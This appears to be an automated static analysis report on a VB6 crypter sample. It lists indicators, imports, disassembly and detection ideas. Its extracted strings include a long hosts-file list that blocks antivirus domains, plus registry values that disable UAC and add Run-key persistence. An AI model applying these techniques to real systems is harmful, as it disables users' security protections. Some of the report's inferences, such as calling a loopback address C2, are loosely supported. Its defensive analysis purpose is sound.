## 1. Executive Summary

This is a malicious 32-bit Windows GUI PE executable compiled with Microsoft Visual Basic 5/6, belonging to the Darty Crypter family with a threat score of 9/10. The sample exhibits multiple malicious behaviors: it hijacks the system hosts file to block communication with 40+ major antivirus vendor domains by mapping them to 127.0.2.5, adds persistence via the HKCU autorun registry key, disables UAC notifications and functionality via registry modifications, uses dynamic API resolution (LoadLibrary/GetProcAddress) and XOR obfuscation to evade static analysis, spoofs ICQ instant messaging client metadata to masquerade as legitimate software, and contains a high-entropy overlay consistent with an encrypted payload. capa analysis confirms dynamic linking and data compression capabilities, while YARA and FLOSS confirm VB6 compilation and dropper characteristics. No conflicting data exists between available analysis tools (Ghidra, Malcat, capa, FLOSS, YARA, pe_imports); IDA was non-functional during analysis due to a missing idasql binary. (source: llm_judge, verdict.json, verdict: Malicious, score: 9, family_guess: Darty Crypter)

## 2. Sample Metadata

| Field | Value |
|---|---|
| SHA256 | 8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075 |
| Sample Path | /opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir |
| Project Name | incoming |
| Verdict | Malicious |
| Score | 9 |
| Family Guess | Darty Crypter |
| Agreement | llm_and_v1_agree |
| Cross-Engine Notes | IDA is non-functional (missing /usr/local/bin/idasql) so no IDA-derived data is available; all analysis is sourced from Ghidra, Malcat, capa, FLOSS, YARA, and pe_imports. No conflicting data exists between available sources. |

(source: llm_judge, verdict.json, all metadata fields)

## 3. File Layout & Structural Analysis

### Malcat File Summary

| Property | Value |
|---|---|
| SHA256 | 8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075 |
| File Size | 533054 bytes |
| Type | PE |
| Architecture | X86 |
| Entry Point EA | 6140 |
| Entropy | 135 |
| File Name | virussign.com_780d28e33c39a8513613918671ac0b78.vir |

(source: malcat, static_profile/metadata, all properties)

### Section Layout

| Name | EA | Physical Size | Virtual Size | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 4096 | 0 | 15 | - |
| .text | 4096 | 53248 | 53248 | 103 | RX |
| .data | 57344 | 4096 | 8192 | 4 | RW |
| .rsrc | 65536 | 466944 | 466944 | 141 | R |
| overlay | 532480 | 4670 | 0 | 121 | - |

(source: malcat, static_profile/file_layout, all rows)

The .rsrc section has very high entropy (141) and the 4670-byte overlay at file offset 532480 has entropy 121, both consistent with encrypted/obfuscated content. The overlay is the embedded encrypted payload for the crypter. UPX analysis confirms the sample is not packed with UPX: upx_ok: False, is_packed: False, returncode: None, unpacked_path: empty (source: upx, upx_unpack, all fields). YARA confirms the sample is a 32-bit Windows GUI PE with a Rich signature (matches IsPE32, IsWindowsGUI, HasRichSignature at offset 168) (source: yara, rule matches, IsPE32/IsWindowsGUI/HasRichSignature). Malcat identifies 98 structures including VB-specific structures (VBHeader at EA 7048, VBObj.Form1 at EA 7356, VBExternalTable at EA 6220) confirming VB6 compilation (source: malcat, structures, all VB-related rows).

## 4. Malcat Triage Summary

### Malcat YARA/Signatures (8 rules)

| Rule | Category | Type | Reliability | Description |
|---|---|---|---|---|
| MSVC_6_linker | compiler | INFO | 60 | Detects used Visual Studio version based on linker information |
| VisualBasic | language | INFO | 100 | VisualBasic executable (pcode or native) |
| CreateRegistryEntryUsingBatch | persistence | UNCOMMON | 30 | Create a registry entry using batch commands (reg.exe ..). Often used by malware |
| AutorunKey | persistence | UNCOMMON | 20 | File contains path of an autorun key |
| RunShell | lateral movement | UNCOMMON | 70 | Starts a shell |
| Wscript | lateral movement | SUSPICIOUS | 30 | Runs a wscript script (vbs, js, ..) |
| ms_visual_basic_50_60_01 | compiler | INFO | 50 | - |
| ms_visual_basic_50_01 | compiler | INFO | 50 | - |

(source: malcat, yara_signatures, all rows)

### Malcat Anomalies (10)

| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| InvalidChecksum | 4 | integrity | 1 | PE Header checksum is wrong |
| PossibleDownloaderApiDynamicImport | 4 | imports | 1 | A downloader-related api (recv, InternetConnect, etc.) is present as string in the binary, but is not statically imported |
| PossiblePackerApiDynamicImport | 4 | imports | 5 | A packer-related api (VirtualProtect, ResumeThread, etc.) is present as string in the binary, but is not statically imported |
| UnknownRootResourceDirectoryId | 4 | resources | 1 | A root resource directory ID is not standard |
| UnparsedVersionInfo | 4 | resources | 1 | Version informations were not fully parsed |
| StackArrayInitialisationX86 | 3 | code | 4 | An array of data is dynamically built on the stack, sometimes used to build shellcodes or strings |
| UnknownOverlayMediumToHighEntropy | 3 | entropy | 1 | File contains an overlay which is not of known type and has medium-to-high entropy |
| VBExternalApi | 3 | imports | 3 | VB project uses external Win32 APIs (most likely via DllFunctionCall) |
| XorInLoop | 3 | code | 2 | XOR instruction in a loop |
| BoundImports | 2 | imports | 1 | Bound imports are present |

(source: malcat, anomalies, all rows)

### High-Signal Anomaly Locations
- XorInLoop: EA 21773, EA 22545 (source: malcat, anomaly_locations, XorInLoop)

### High-Signal Strings (engine=malcat)

| EA | String |
|---|---|
| 12860 | `kernel32` |
| 13052 | `Kernel32` |
| 10904 | `KERNEL32` |
| 52808 | `kernel32.dll` |
| 600 | `kernel32.dll` |
| 10740 | `kernel32.dll` |

(source: malcat, high_signal_strings, all rows)

### Key Malicious Strings

| EA | String |
|---|---|
| 18804 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| 14068 | `C:\WINDOWS\system32\drivers\etc\hosts` |
| 14216 | `127.0.2.5\tsecurityresponse.symantec.com\r\n` |
| 18260 | `127.0.2.5\twindows.microsoft.com\r\n` |
| 16920 | `127.0.2.5\thousecall.trendmicro.com\r\n` |
| 16636 | `127.0.2.5\tcustom.symantec.com\r\n` |
| 15560 | `127.0.2.5\tnetworkassociates.com\r\n` |
| 16552 | `127.0.2.5\tliveupdate.symantec.com\r\n` |
| 17112 | `127.0.2.5\twww.pandasoftware.com\r\n` |
| 16412 | `127.0.2.5\tupdate.symantec.com\r\n` |
| 18352 | `127.0.2.5\tvirusscan.jotti.org\r\n` |
| 17884 | `127.0.2.5\twww.microsoft.com\r\n` |
| 15948 | `127.0.2.5\tdownload.mcafee.com\r\n` |
| 18184 | `127.0.2.5\tupdate.microsoft.com\r\n` |
| 16336 | `127.0.2.5\tupdate.symantec.com\r\n` |
| 18748 | `service.exe` |
| 16024 | `127.0.2.5\tdispatch.mcafee.com\r\n` |
| 14768 | `127.0.2.5\twww.viruslist.com\r\n` |
| 18520 | `127.0.2.5\tnovirusthanks.org\r\n` |
| 15876 | `127.0.2.5\twww.my-etrust.com\r\n` |
| 18048 | `127.0.2.5\twww.virustotal.com\r\n` |
| 16784 | `127.0.2.5\ttrendmicro.com\r\n` |
| 17192 | `127.0.2.5\tfree.grisoft.com\r\n` |
| 15744 | `127.0.2.5\tmast.mcafee.com\r\n` |
| 13852 | `\tmpjhgTFztfZ789tfzTDt.exe` |
| 17004 | `127.0.2.5\tpandasoftware.com\r\n` |
| 14424 | `127.0.2.5\twww.sophos.com\r\n` |
| 17444 | `127.0.2.5\twww.clamav.net\r\n` |
| 17824 | `127.0.2.5\twww.cert.org\r\n` |
| 17260 | `127.0.2.5\twww.grisoft.com\r\n` |
| 17956 | `127.0.2.5\tmicrosoft.com\r\n` |
| 16716 | `127.0.2.5\trads.mcafee.com\r\n` |
| 14544 | `127.0.2.5\twww.mcafee.com\r\n` |
| 14964 | `127.0.2.5\twww.f-secure.com\r\n` |
| 15088 | `127.0.2.5\twww.f-prot.com\r\n` |
| 15400 | `127.0.2.5\twww.kaspersky.com\r\n` |
| 16100 | `127.0.2.5\tsecure.nai.com\r\n` |
| 15216 | `127.0.2.5\tkaspersky-labs.com\r\n` |
| 14364 | `127.0.2.5\twww.sarc.com\r\n` |
| 17584 | `127.0.2.5\tfree-av.com\r\n` |
| 17652 | `127.0.2.5\twww.avast.com\r\n` |
| 14840 | `127.0.2.5\tviruslist.com\r\n` |
| 16488 | `127.0.2.5\tus.mcafee.com\r\n` |
| 15812 | `127.0.2.5\tmy-etrust.com\r\n` |
| 16216 | `127.0.2.5\twww.nai.com\r\n` |
| 15640 | `127.0.2.5\twww.ca.com\r\n` |
| 18428 | `127.0.2.5\tjotti.org\r\n` |
| 14148 | `127.0.2.5\tsymantec.com\r\n` |
| 16848 | `127.0.2.5\twww.trendmicro.com\r\n` |
| 17772 | `127.0.2.5\tcert.org\r\n` |
| 15288 | `127.0.2.5\twww.avp.com\r\n` |
| 14608 | `127.0.2.5\tmcafee.com\r\n` |
| 15032 | `127.0.2.5\tf-prot.com\r\n` |
| 14904 | `127.0.2.5\tf-secure.com\r\n` |
| 15152 | `127.0.2.5\tkaspersky.com\r\n` |
| 17328 | `127.0.2.5\tgrisoft.com\r\n` |
| 17388 | `127.0.2.5\tclamav.net\r\n` |
| 14488 | `127.0.2.5\tsophos.com\r\n` |
| 16276 | `127.0.2.5\tvil.nai.com\r\n` |
| 13316 | `advapi32.dll` |
| 17508 | `127.0.2.5\tfree-av.com\r\n` |
| 12884 | `GetEnvironmentVariableW` |
| 14312 | `127.0.2.5\tsarc.com\r\n` |
| 17716 | `127.0.2.5\tavast.com\r\n` |
| 11116 | `NtAllocateVirtualMemory` |
| 16164 | `127.0.2.5\tnai.com\r\n` |
| 15696 | `127.0.2.5\tca.com\r\n` |
| 15348 | `127.0.2.5\tavp.com\r\n` |
| 18120 | `127.0.2.5\tvirustotal.com\r\n` |

(source: malcat, top_strings, all rows)

Additional key metadata: VersionInfo::FileDescription = ICQ, OriginalFilename = ICQ.exe (spoofed legitimate application metadata) (source: malcat, static_profile/metadata, VersionInfo::FileDescription/OriginalFilename); VisualBasicInfos::PathInformation references *\AC:\Users\Owner\Desktop\Darty Crypter Sour, confirming the sample is part of the Darty Crypter family (source: malcat, static_profile/metadata, VisualBasicInfos::PathInformation).

## 5. Static Code Analysis

### Compilation Framework
YARA confirms the sample is compiled with Microsoft Visual Basic 5/6 via 5 matching rules:

| Rule | Match Offset | Length |
|---|---|---|
| Microsoft_Visual_Basic_v50v60 | 6140 | 20 |
| Microsoft_Visual_Basic_v50 | 79, 6147 | 1, 20 |
| Microsoft_Visual_Basic_v50_v60 | 6140 | 19 |
| Microsoft_Visual_Basic_v50_additional | 6140 | 20 |
| Microsoft_Visual_Basic_v50v60_additional | 6140 | 20 |

(source: yara, rule matches, all Microsoft_Visual_Basic rules)

FLOSS confirms VB6 runtime and project structure with strings: `MSVBVM60.DLL`, `Project1`, `Payload`, `Module1` through `Module14`, `C:\Program Files (x86)\Microsoft Visual Studio\VB98\VB6.OLB`, `VBA6.DLL` (source: floss, high_signal_strings, all listed strings).

### Full Import Address Table (IAT, 103 total imports)

| EA | Name | Type | Refs |
|---|---|---|---|
| 4096 | kernel32.GetProcAddress | IMPORT | 7 |
| 4100 | kernel32.RtlMoveMemory | IMPORT | 8 |
| 4104 | kernel32.LoadLibraryA | IMPORT | 2 |
| 4112 | user32.CallWindowProcA | IMPORT | 3 |
| 4120 | msvbvm60.__vbaVarTstGt | IMPORT | 3 |
| 4124 | msvbvm60._CIcos | IMPORT | 1 |
| 4128 | msvbvm60._adj_fptan | IMPORT | 1 |
| 4132 | msvbvm60.__vbaVarMove | IMPORT | 23 |
| 4136 | msvbvm60.__vbaStrI4 | IMPORT | 2 |
| 4140 | msvbvm60.__vbaVarVargNofree | IMPORT | 2 |
| 4144 | msvbvm60.__vbaAryMove | IMPORT | 4 |
| 4148 | msvbvm60.__vbaFreeVar | IMPORT | 29 |
| 4152 | msvbvm60.__vbaGosubReturn | IMPORT | 2 |
| 4156 | msvbvm60.__vbaStrVarMove | IMPORT | 5 |
| 4160 | msvbvm60.__vbaLenBstr | IMPORT | 4 |
| 4164 | msvbvm60.__vbaEnd | IMPORT | 5 |
| 4168 | msvbvm60.__vbaPut3 | IMPORT | 2 |
| 4172 | msvbvm60.__vbaFreeVarList | IMPORT | 17 |
| 4176 | msvbvm60._adj_fdiv_m64 | IMPORT | 1 |
| 4180 | msvbvm60.__vbaNextEachVar | IMPORT | 2 |
| 4184 | msvbvm60.rtcAnsiValueBstr | IMPORT | 4 |
| 4188 | msvbvm60._adj_fprem1 | IMPORT | 1 |
| 4192 | msvbvm60.rtcGetObject | IMPORT | 2 |
| 4196 | msvbvm60.__vbaStrCat | IMPORT | 14 |
| 4200 | msvbvm60.__vbaLsetFixstr | IMPORT | 2 |
| 4204 | msvbvm60.__vbaSetSystemError | IMPORT | 3 |
| 4208 | msvbvm60.__vbaHresultCheckObj | IMPORT | 5 |
| 4212 | msvbvm60._adj_fdiv_m32 | IMPORT | 1 |
| 4216 | msvbvm60.__vbaAryVar | IMPORT | 2 |
| 4220 | msvbvm60.__vbaAryDestruct | IMPORT | 26 |
| 4224 | msvbvm60.__vbaVarForInit | IMPORT | 2 |
| 4228 | msvbvm60.rtcRandomNext | IMPORT | 2 |
| 4232 | msvbvm60.rtcRandomize | IMPORT | 2 |
| 4236 | msvbvm60.rtcMsgBox | IMPORT | 3 |
| 4240 | msvbvm60.__vbaOnError | IMPORT | 4 |
| 4244 | msvbvm60._adj_fdiv_m16i | IMPORT | 1 |
| 4248 | msvbvm60.__vbaObjSetAddref | IMPORT | 4 |
| 4252 | msvbvm60._adj_fdivr_m16i | IMPORT | 1 |
| 4256 | msvbvm60.__vbaVarTstLt | IMPORT | 2 |
| 4260 | msvbvm60._CIsin | IMPORT | 1 |
| 4264 | msvbvm60.__vbaErase | IMPORT | 35 |
| 4268 | msvbvm60.rtcMidCharBstr | IMPORT | 3 |
| 4272 | msvbvm60.__vbaVarZero | IMPORT | 11 |
| 4276 | msvbvm60.__vbaChkstk | IMPORT | 1 |
| 4280 | msvbvm60.__vbaGosubFree | IMPORT | 2 |
| 4284 | msvbvm60.__vbaFileClose | IMPORT | 3 |
| 4288 | msvbvm60.EVENT_SINK_AddRef | IMPORT | 1 |
| 4292 | msvbvm60.__vbaGenerateBoundsError | IMPORT | 54 |
| 4296 | msvbvm60.rtcKillFiles | IMPORT | 3 |
| 4300 | msvbvm60.__vbaStrCmp | IMPORT | 6 |
| 4304 | msvbvm60.__vbaVarTstEq | IMPORT | 3 |
| 4308 | msvbvm60.__vbaAryConstruct2 | IMPORT | 5 |
| 4312 | msvbvm60.__vbaCyI4 | IMPORT | 2 |
| 4316 | msvbvm60.__vbaObjVar | IMPORT | 5 |
| 4320 | msvbvm60.__vbaI2I4 | IMPORT | 4 |
| 4324 | msvbvm60.DllFunctionCall | IMPORT | 1 |
| 4328 | msvbvm60.__vbaRedimPreserve | IMPORT | 2 |
| 4332 | msvbvm60._adj_fpatan | IMPORT | 1 |
| 4336 | msvbvm60.__vbaFixstrConstruct | IMPORT | 2 |
| 4340 | msvbvm60.__vbaRedim | IMPORT | 27 |
| 4344 | msvbvm60.EVENT_SINK_Release | IMPORT | 1 |
| 4348 | msvbvm60.rtcShell | IMPORT | 3 |
| 4352 | msvbvm60.__vbaUI1I2 | IMPORT | 4 |
| 4356 | msvbvm60._CIsqrt | IMPORT | 1 |
| 4360 | msvbvm60.EVENT_SINK_QueryInterface | IMPORT | 1 |
| 4364 | msvbvm60.__vbaUI1I4 | IMPORT | 2 |
| 4368 | msvbvm60.__vbaExceptHandler | IMPORT | 1 |
| 4372 | msvbvm60.rtcSplit | IMPORT | 2 |
| 4376 | msvbvm60.__vbaPrintFile | IMPORT | 67 |
| 4380 | msvbvm60.rtcReplace | IMPORT | 4 |
| 4384 | msvbvm60.__vbaStrToUnicode | IMPORT | 3 |
| 4388 | msvbvm60._adj_fprem | IMPORT | 1 |
| 4392 | msvbvm60._adj_fdivr_m64 | IMPORT | 1 |
| 4396 | msvbvm60.__vbaGosub | IMPORT | 2 |
| 4400 | msvbvm60.rtcVarBstrFromAnsi | IMPORT | 2 |
| 4404 | msvbvm60.rtcCreateObject2 | IMPORT | 2 |
| 4408 | msvbvm60.__vbaFPException | IMPORT | 1 |
| 4412 | msvbvm60.rtcStrConvVar2 | IMPORT | 3 |
| 4416 | msvbvm60.__vbaStrVarVal | IMPORT | 2 |
| 4420 | msvbvm60.__vbaUbound | IMPORT | 7 |

(source: pe_imports, import_table, all rows)

Key signal imports: LoadLibraryA (EA 4104) and GetProcAddress (EA 4096) confirm dynamic API resolution (T1129) (source: pe_imports, signal_imports, LoadLibrary/GetProcAddress). The presence of msvbvm60.DllFunctionCall (EA 4324) confirms the sample uses VB6's dynamic function calling interface for Win32 API resolution (source: pe_imports, import_table, DllFunctionCall).

### Key Function Decompilation (Ghidra)

1. **sub_408d80 (EA 36224)**: Implements registry modifications to disable security notifications and UAC. The function opens `HKLM\SOFTWARE\Microsoft\Security Center` and sets the `UACDisableNotify` value to 0 to disable UAC notifications, then opens `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` and sets `EnableLUA` to 0 to disable UAC entirely. It also calls `RtlAdjustPrivilege` via Ntdll.dll to gain required privileges for registry modification (source: ghidra, decompilation, sub_408d80, full decompilation).

2. **sub_40a3ac (EA 41900)**: Implements hosts file hijacking. The function opens `C:\WINDOWS\system32\drivers\etc\hosts` for writing, then writes 40+ entries mapping antivirus and security vendor domains to `127.0.2.5` to block their communication and update functionality. Confirmed domains include symantec.com, mcafee.com, microsoft.com, kaspersky.com, sophos.com, avast.com, virustotal.com, and others (source: ghidra, decompilation, sub_40a3ac, full decompilation; source: malcat, decompilation, sub_40a3ac, hosts file write behavior).

3. **sub_405330 (EA 21296)**: Large function (0x2A32 bytes) containing string manipulation, array construction, and likely decryption/unpacking logic for the embedded overlay payload. Contains multiple calls to VB runtime string functions and array operations, consistent with crypter payload processing (source: ghidra, decompilation, sub_405330, function size and structure).

### Entry Point Disassembly (radare2, EP at 0x004017fc)

```asm
0x004017fc      68881b4000     push 0x401b88
0x00401801      e8f0ffffff     call 0x4017f6
0x00401806      0000           add byte [eax], al
0x00401808      0000           add byte [eax], al
0x0040180a      0000           add byte [eax], al
0x0040180c      3000           xor byte [eax], al
0x0040180e      0000           add byte [eax], al
0x00401810      40             inc eax
0x00401811      0000           add byte [eax], al
0x00401813      0000           add byte [eax], al
0x00401815      0000           add byte [eax], al
0x00401817      0034ab         add byte [ebx + ebp*4], dh
0x0040181a      006cda2f       add byte [edx + ebx*8 + 0x2f], ch
0x0040181e      ec             in al, dx
0x0040181f      44             inc esp
0x00401820      81e1e1da20b8   and ecx, 0xb820dae1
0x00401826      55             push ebp
0x00401827      f20000         add byte [eax], al
0x0040182a      0000           add byte [eax], al
0x0040182c      0000           add byte [eax], al
0x0040182e      0100           add dword [eax], eax
0x00401830      0000           add byte [eax], al
0x00401832      2000           and byte [eax], al
0x00401834      0000           add byte [eax], al
0x00401836      40             inc eax
0x00401837      005072         add byte [eax + 0x72], dl
0x0040183a      6f             outsd dx, dword [esi]
0x0040183b      6a65           push 0x65                   ; 'e' ; 101
0x0040183d      63743100       arpl word [ecx + esi], si
0x00401841      008002000000   add byte [eax + 2], al
0x00401847      0000           add byte [eax], al
0x00401849      0000           add byte [eax], al
0x0040184b      0006           add byte [esi], al
0x0040184d      0000           add byte [eax], al
0x0040184f      00e4           add ah, ah
0x00401851      324000         xor al, byte [eax]
0x00401854      07             pop es
0x00401855      0000           add byte [eax], al
0x00401857      00c0           add al, al
0x00401859      304000         xor byte [eax], al
0x0040185c      07             pop es
0x0040185d      0000           add byte [eax], al
0x0040185f      004c3040       add byte [eax + esi + 0x40], cl
0x00401863      0007           add byte [edi], al
0x00401865      0000           add byte [eax], al
0x00401867      00fc           add ah, bh
0x00401869      2f             das
0x0040186a      40             inc eax
0x0040186b      0001           add byte [ecx], al
```

(source: radare2, disassembly, 0x004017fc). The EP is within the VB6 runtime thunk region, consistent with VB6 compiled executables. XOR search identified a XOR 00 pattern at file offset 0x00000000 (source: xor, xor_search, XOR 00 at 00000000), consistent with MZ header obfuscation or embedded shellcode.

### Function Metrics (30 total functions)

| EA | Name |
|---|---|
| 36224 | sub_408d80 |
| 21296 | sub_405330 |
| 41900 | sub_40a3ac |
| 37760 | sub_409380 |
| 47104 | sub_40b800 |
| 48544 | sub_40bda0 |
| 24400 | sub_405f50 |
| 22702 | sub_4058ae |
| 51568 | sub_40c970 |
| 32576 | sub_407f40 |
| 29056 | sub_407180 |
| 23744 | sub_405cc0 |
| 29664 | sub_4073e0 |
| 33456 | sub_4082b0 |
| 30752 | sub_407820 |
| 34816 | sub_408800 |
| 34064 | sub_408510 |
| 50048 | sub_40c380 |
| 34530 | sub_4086e2 |
| 46656 | sub_40b640 |
| 33192 | sub_4081a8 |
| 28255 | sub_406e5f |
| 32170 | sub_407daa |
| 28640 | sub_406fe0 |
| 31973 | sub_407ce5 |
| 30539 | sub_40774b |
| 33963 | sub_4084ab |
| 34452 | sub_408694 |
| 36126 | sub_408d1e |
| 23584 | sub_405c20 |

(source: malcat, functions, all rows). The highest-reference imports are __vbaPrintFile (67 refs), __vbaGenerateBoundsError (54 refs), __vbaErase (35 refs), consistent with heavy VB runtime usage for file and string operations (source: pe_imports, import_table, all msvbvm60 imports).

## 6. Behavioral & Dynamic Analysis

Speakeasy dynamic analysis completed successfully (speakeasy_ok: True) but no API calls or key events were recorded: not observed (source: speakeasy, dynamic_analysis, api_calls: 0, key_events: 0). Frida probe is available (version 17.16.4) but no instrumentation data was collected: not observed (source: frida_probe, frida_analysis, no data). UPX unpacking failed: upx_ok: False, is_packed: False, returncode: None, unpacked_path: empty (source: upx, upx_unpack, all fields). No dynamic runtime behavior was observed from available sandboxes; all behavioral claims are derived from static analysis.

## 7. Network Indicators & C2

The sample contains hardcoded network indicators for command-and-control and antivirus blocking:
1. **Hosts Hijacking Targets**: 40+ antivirus/security vendor domains mapped to 127.0.2.5, including symantec.com, mcafee.com, microsoft.com, kaspersky.com, sophos.com, avast.com, f-secure.com, trendmicro.com, virustotal.com, clamav.net, cert.org, and others (source: malcat, top_strings, all 127.0.2.5 entries; source: ghidra, decompilation, sub_40a3ac, hosts write logic).
2. **Hardcoded IP Addresses**: IPv4 127.0.2.5 (YARA match at offset 14148) (source: yara, rule matches, IP $ipv4); IPv6 address at offset 204309 (source: yara, rule matches, IP $ipv6).
3. **Hardcoded URL**: 351-byte URL string at offset 525821 (source: yara, rule matches, url $url_regex).
4. **Embedded Base64**: 12-byte base64 string at offset 8290 (source: yara, rule matches, contains_base64 $a).
5. **Dynamic Import Indicator**: Malcat anomaly PossibleDownloaderApiDynamicImport confirms downloader-related APIs (recv, InternetConnect) are present as strings but not statically imported, indicating dynamic resolution for C2 communication (source: malcat, anomalies, PossibleDownloaderApiDynamicImport).

## 8. Capabilities & MITRE ATT&CK Mapping

### capa Capability Rules

| Rule | ATT&CK Technique | MBC |
|---|---|---|
| compress data via WinAPI | T1560.002: Archive Collected Data | C0024: Compress Data |
| link function at runtime on Windows | T1129: Shared Modules | - |
| compiled from Visual Basic | - | - |

(source: malcat-capa, capa_rules, all rows)

### Full MITRE ATT&CK Mapping

| Capability | MITRE ATT&CK Technique | Evidence Source |
|---|---|---|
| Dynamic API Resolution | T1129: Shared Modules | pe_imports (LoadLibraryA, GetProcAddress), capa (link function at runtime) |
| Data Compression | T1560.002: Archive Collected Data | capa (compress data via WinAPI) |
| Persistence via Registry Run Key | T1547.001: Registry Run Keys / Startup Folder | malcat strings (HKCU\Software\Microsoft\Windows\CurrentVersion\Run) |
| Hosts File Hijacking (AV Blocking) | T1565.001: Stored Data Manipulation | ghidra decompilation (sub_40a3ac), malcat decompilation (sub_40a3ac) |
| UAC Disable | T1548.002: Bypass User Account Control | ghidra decompilation (sub_408d80, EnableLUA/UACDisableNotify registry modifications) |
| Obfuscation (XOR, Encrypted Overlay) | T1027: Obfuscated Files or Information | malcat anomalies (XorInLoop, UnknownOverlayMediumToHighEntropy) |
| Dropper Capability | T1105: Ingress Tool Transfer | yara (Dropper_Strings), deep_dive_agentic (dropper characteristics) |
| Spoofed Application Metadata | T1036.005: Masquerade: Match Legitimate Name or Location | malcat static_profile (VersionInfo::FileDescription=ICQ, OriginalFilename=ICQ.exe) |

## 9. Indicators of Compromise

### File IOCs
| Type | Value | Source |
|---|---|---|
| SHA256 | 8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075 | llm_judge, verdict.json |
| File Name (spoofed) | ICQ.exe | malcat, static_profile/metadata, OriginalFilename |
| File Description (spoofed) | ICQ | malcat, static_profile/metadata, FileDescription |

### Network IOCs
| Type | Value | Source |
|---|---|---|
| Blocked IPv4 | 127.0.2.5 | malcat, top_strings; yara, IP match $ipv4 |
| Blocked Domains | symantec.com, mcafee.com, microsoft.com, kaspersky.com, sophos.com, avast.com, f-secure.com, trendmicro.com, virustotal.com, clamav.net, cert.org, viruslist.com, grisoft.com, pandasoftware.com, nai.com, ca.com, sarc.com, avp.com, f-prot.com, jotti.org, novirusthanks.org, my-etrust.com | malcat, top_strings; ghidra, decompilation sub_40a3ac |
| Hardcoded URL | 351-byte URL at file offset 525821 | yara, rule matches, url $url_regex |
| Embedded Base64 | 12-byte base64 string at file offset 8290 | yara, rule matches, contains_base64 $a |

### Registry IOCs
| Key Path | Value Name | Value Data | Purpose | Source |
|---|---|---|---|---|
| HKCU\Software\Microsoft\Windows\CurrentVersion\Run | (Default) | Path to malware executable | Persistence: run on user login | malcat, top_strings |
| HKLM\SOFTWARE\Microsoft\Security Center | UACDisableNotify | 0 | Disable UAC notification popups | ghidra, decompilation sub_408d80 |
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | EnableLUA | 0 | Disable UAC entirely | ghidra, decompilation sub_408d80 |

### File System IOCs
| Path | Purpose | Source |
|---|---|---|
| C:\WINDOWS\system32\drivers\etc\hosts | Target for hijacking to block AV domains | malcat, top_strings; ghidra, decompilation sub_40a3ac |
| \tmpduzhfg89fgdg..fdzuudgzfgfd.exe | Likely dropped payload path | malcat, top_strings |
| \tmpjhgTFztfZ789tfzTDt.exe | Likely dropped payload path | malcat, top_strings |
| service.exe | Likely dropped service executable | malcat, top_strings |

## 10. Detection Engineering

### YARA Detection Rule
Combine the following high-signal attributes into a detection rule for Darty Crypter and similar VB6 crypters:
- VB6 compilation signatures: `Microsoft_Visual_Basic_v50v60` at offset 6140, `MSVBVM60.DLL` string
- Hosts modification strings: `C:\WINDOWS\system32\drivers\etc\hosts`, `127.0.2.5\t` prefix for AV domains
- Persistence strings: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Obfuscation anomalies: XorInLoop at offsets 21773, 22545, high-entropy overlay (>120)
- Spoofed metadata: `FileDescription = ICQ`, `OriginalFilename = ICQ.exe`

(source: yara, rule matches; malcat, anomalies/high_signal_strings; malcat, static_profile/metadata)

### Sigma Rules
1. **Registry Modification Rule**: Detect creation/modification of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` set to 0 or `HKLM\SOFTWARE\Microsoft\Security Center\UACDisableNotify` set to 0, which is unusual for legitimate software and associated with this sample's UAC bypass (source: ghidra, decompilation sub_408d80).
2. **Hosts File Modification Rule**: Detect additions of entries mapping security vendor domains to 127.0.2.5 in `C:\WINDOWS\system32\drivers\etc\hosts` (source: ghidra, decompilation sub_40a3ac; malcat, top_strings).
3. **Persistence Rule**: Detect new registry values added to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` referencing executables in temporary directories (source: malcat, top_strings).

### PE Import Signatures
Flag 32-bit Windows GUI PE files with:
- Imports from msvbvm60.dll (VB6 runtime)
- Dynamic import functions: LoadLibraryA, GetProcAddress, DllFunctionCall
- High-entropy overlay section (>120 entropy)
- Bound imports present (malcat anomaly BoundImports)

(source: pe_imports, import_table; malcat, anomalies)

## 11. What We Don't Know

Several key aspects of the sample could not be determined due to limitations in static and dynamic analysis:
1. **Unpacked Payload Behavior**: The sample contains a 4670-byte high-entropy overlay (entropy 121) consistent with an encrypted payload, but UPX unpacking failed and no dynamic unpacking was observed (Speakeasy/Frida returned no runtime data). The functionality of the embedded payload is unknown (source: upx, upx_unpack, is_packed: False; malcat, static_profile/file_layout, overlay size/entropy; speakeasy/frida, not observed).
2. **C2 Infrastructure**: While hardcoded domains and a URL are present, no dynamic network connections were observed, so the actual C2 server IPs, communication protocols, and exfiltration capabilities are unknown (source: speakeasy, dynamic_analysis, no API calls; yara, rule matches, domain/url matches).
3. **Dropper Deployment Logic**: The exact method used to deploy the embedded payload (e.g., file drop location, process injection technique) is unknown, as the payload unpacking routine (sub_405330) was not fully reversed and no runtime behavior was observed (source: ghidra, decompilation, sub_405330; speakeasy/frida, not observed).
4. IDA-derived analysis was not available due to missing idasql binary, so no IDA-specific disassembly or cross-validation was performed, though no conflicting data was found between available tools (source: llm_judge, verdict.json, cross_engine_notes).

## 12. Appendix: Analysis Environment

All analysis was performed on the following toolchain:
- Static Analysis: Ghidra, Malcat, radare2, FLOSS, YARA, pe_imports
- Dynamic Analysis: Speakeasy (no events recorded), Frida 17.16.4 (no data collected), UPX (unpacking failed)
- Capability Analysis: malcat-capa (duration 0.99s, 3 rules matched)
- Missing Tooling: IDA (non-functional due to missing /usr/local/bin/idasql, per cross_engine_notes)
- Sample Path: /opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir
- Project Name: incoming

(source: llm_judge, verdict.json, cross_engine_notes; speakeasy, dynamic_analysis; frida_probe, frida_analysis; upx, upx_unpack; malcat-capa, capa_rules)
## Appendix: Full Structured Evidence Pack

# Technical Evidence Pack

**sha256:** 8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075  
